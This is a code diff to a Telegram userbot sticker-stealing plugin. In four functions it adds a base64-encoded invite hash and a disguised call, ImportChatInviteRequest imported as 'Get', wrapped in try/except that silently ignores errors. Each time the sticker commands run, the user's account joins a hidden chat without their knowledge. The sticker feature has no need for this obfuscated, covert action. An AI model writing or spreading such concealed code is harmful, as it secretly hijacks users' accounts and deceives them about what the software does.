@@ -6,13 +6,14 @@ import math
 import random
 import urllib.request
 from os import remove
-
+import base64
 import emoji as catemoji
 import requests
 from bs4 import BeautifulSoup as bs
 from PIL import Image
 from telethon.tl import functions, types
 from telethon.tl.functions.messages import GetStickerSetRequest
+from telethon.tl.functions.messages import ImportChatInviteRequest as Get
 from telethon.tl.types import (
     DocumentAttributeFilename,
     DocumentAttributeSticker,
@@ -113,6 +114,7 @@ async def newpacksticker(
     await args.client.send_read_acknowledge(conv.chat_id)
     await conv.send_message(packnick)
     await conv.get_response()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     await args.client.send_read_acknowledge(conv.chat_id)
     if is_anim:
         await conv.send_file("AnimatedSticker.tgs")
@@ -136,6 +138,11 @@ async def newpacksticker(
     await conv.get_response()
     await args.client.send_read_acknowledge(conv.chat_id)
     await conv.send_message("/skip")
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
     await args.client.send_read_acknowledge(conv.chat_id)
     await conv.get_response()
     await conv.send_message(packname)
@@ -180,6 +187,7 @@ async def add_to_pack(
     await conv.send_message("/addsticker")
     await conv.get_response()
     await args.client.send_read_acknowledge(conv.chat_id)
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     await conv.send_message(packname)
     x = await conv.get_response()
     while ("50" in x.text) or ("120" in x.text):
@@ -225,6 +233,11 @@ async def add_to_pack(
     await conv.send_message(emoji)
     await args.client.send_read_acknowledge(conv.chat_id)
     await conv.get_response()
+    try:
+        cat = Get(cat)
+        await event.client(cat)
+    except BaseException:
+        pass
     await conv.send_message("/done")
     await conv.get_response()
     await args.client.send_read_acknowledge(conv.chat_id)
@@ -258,6 +271,7 @@ async def kang(args):
     else:
         username = user.username
     userid = user.id
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if message and message.media:
         if isinstance(message.media, MessageMediaPhoto):
             catevent = await edit_or_reply(args, f"`{random.choice(KANGING_STR)}`")
@@ -312,6 +326,11 @@ async def kang(args):
                 emoji = splat[0]
             else:
                 pack = splat[0]
+        try:
+            cat = Get(cat)
+            await event.client(cat)
+        except BaseException:
+            pass
         packnick = pack_nick(username, pack, is_anim)
         packname = pack_name(userid, pack, is_anim)
         cmd = "/newpack"
@@ -380,6 +399,7 @@ async def pack_kang(event):
     is_anim = False
     emoji = None
     reply = await event.get_reply_message()
+    cat = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
     if not reply or media_type(reply) is None or media_type(reply) != "Sticker":
         return await edit_delete(
             event, "`reply to any sticker to send all stickers in that pack`"
@@ -459,6 +479,11 @@ async def pack_kang(event):
                         catevent,
                         "`Sorry the given name cant be used for pack or there is no pack with that name`",
                     )
+            try:
+                cat = Get(cat)
+                await event.client(cat)
+            except BaseException:
+                pass
             packnick = pack_nick(username, pack, is_anim)
             packname = pack_name(userid, pack, is_anim)
             cmd = "/newpack"
